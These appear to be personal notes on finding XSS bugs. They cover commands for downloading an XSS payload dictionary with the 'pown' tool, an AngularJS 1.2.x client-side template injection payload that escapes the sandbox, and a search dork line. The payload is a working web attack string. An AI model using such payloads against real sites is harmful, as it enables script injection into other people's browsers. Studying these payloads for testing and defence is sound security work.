# XSS

## 2021.2.13 Fuzz技巧

![image-20210213152848214](XSS.assets/image-20210213152848214.png)

非常不错,包含了xml和xss的许多payload

```
npm install -g pown
pown modules install @pown/dicts
pown dicts -p xss >  xss.doc
ls -lah xss.doc
```







## Bypass

![5934BE93A312FA7C13363F1A4C187775](XSS.assets/5934BE93A312FA7C13363F1A4C187775.png)



## 挖掘XSS技巧

### 组件漏洞

an AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29

Payload:

```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```



## Dorks

```
1.iconUrl=XSS
```

